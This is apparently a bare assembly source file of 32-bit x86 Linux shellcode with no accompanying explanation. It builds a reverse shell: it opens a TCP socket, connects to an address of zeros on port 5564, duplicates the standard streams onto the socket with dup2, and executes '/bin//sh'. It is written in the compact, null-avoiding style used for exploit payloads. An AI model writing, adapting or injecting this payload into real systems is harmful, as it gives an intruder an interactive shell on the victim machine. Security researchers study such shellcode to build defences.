section .text

global _start:

_start:
	xor eax,eax
	xor ebx,ebx	
	xor ecx,ecx
	xor edx,edx
	xor esi,esi
	xor edi,edi

	mov al,102
	mov bl,1
	push edi
	push 0x1
	push 0x2
	mov ecx,esp
	int 80h		; socket()

	mov edx,eax
	
	push edi	
	push edi
	push edi 
	push word 0xbc15
	push word 0x2
	mov ecx,esp
	
	push 16
	push ecx
	push edx	
	mov ecx,esp
	mov al,102	
	mov bl,3
	int 80h

	xor ecx,ecx
	mov cl,2

dup2:
	mov al,63
	mov ebx,edx
	int 80h

	dec ecx
	jns dup2

	inc ecx
	push ecx
	push 0x68732f6e
	push 0x69622f2f
	mov ebx,esp
	xor edx,edx
	mov al,0xb
	int 80h
